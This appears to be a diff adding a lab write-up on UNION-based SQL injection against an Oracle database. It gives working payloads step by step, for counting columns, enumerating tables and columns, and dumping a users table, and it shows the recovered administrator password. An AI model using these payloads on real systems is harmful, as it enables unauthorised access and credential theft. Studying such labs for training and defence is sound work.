@@ -1,0 +1,43 @@
+SQL injection attack, listing the database contents on Oracle
+
+End Goals:
+- Determine which table contains the usernames and passwords
+- Determine the column names in table
+- Output the content of the table
+- Login as the administrator user 
+
+Analysis:
+---------
+
+==========Step 1: Determine the number of columns that the vulnerable query is using==========
+' order by 1--     /*200 OK*/
+' order by 2--     /*200 OK*/
+' order by 3--     !Error!
+-> The number of columns is 2
+
+==========Step 2: Determine the data type of columns==========
+' UNION select 'a', NULL from DUAL--
+-> 200 OK
+' UNION select 'a', 'a' from DUAL--
+-> 200 OK
+-> Oracle database
+-> both columns are of data type string
+
+==========Step 3: Output the list of tables in the database==========
+' UNION SELECT table_name, NULL FROM all_tables--
+
+USERS_SGMNNG
+
+==========Step 4: Output the column names of the users table==========
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_SGMNNG'-- 
+
+USERNAME_UHIWGT
+PASSWORD_IVSMHZ
+
+==========Step 5: Output the list of usernames/passwords==========
+' UNION select USERNAME_UHIWGT, PASSWORD_IVSMHZ from USERS_SGMNNG--
+
+administrator
+stddm36lmun0v09fkiij
+
+script.py <url>
